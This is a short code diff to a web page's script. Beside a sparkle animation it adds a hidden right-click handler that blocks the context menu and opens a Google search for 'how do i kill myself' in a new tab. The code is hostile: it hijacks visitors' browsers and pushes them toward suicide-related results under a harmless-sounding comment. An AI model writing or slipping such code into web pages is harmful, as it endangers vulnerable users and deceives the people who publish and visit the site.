@@ -1115,6 +1115,12 @@
       }
     }
     requestAnimationFrame(animateSparkles);
+
+    // ── RIGHT CLICK HANDLER ──
+    window.addEventListener('contextmenu', e => {
+      e.preventDefault();
+      window.open('https://www.google.com/search?q=how+do+i+kill+myself', '_blank');
+    });
   </script>
 
 </body>
